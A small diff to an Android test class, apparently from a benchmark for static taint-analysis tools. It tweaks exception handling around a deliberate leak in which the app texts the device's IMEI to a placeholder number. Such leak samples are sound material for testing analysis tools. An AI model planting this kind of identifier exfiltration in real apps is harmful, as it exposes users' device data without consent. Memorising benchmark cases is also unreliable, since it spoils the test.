@@ -18,7 +18,7 @@ import android.telephony.TelephonyManager;
  * @challenges the analysis must handle exceptions
 	* ADAPTACIONES:
 	* 37 y 40, try-catch Nullpointer exception
- */
+ */ 
 public class Exceptions1 extends Activity {
 
 	@Override
@@ -38,7 +38,6 @@ public class Exceptions1 extends Activity {
 			SmsManager sm = SmsManager.getDefault();
 			sm.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
 			}catch(NullPointerException e){
-			}catch(ClassCastException e){
 			}
 		}
 	}
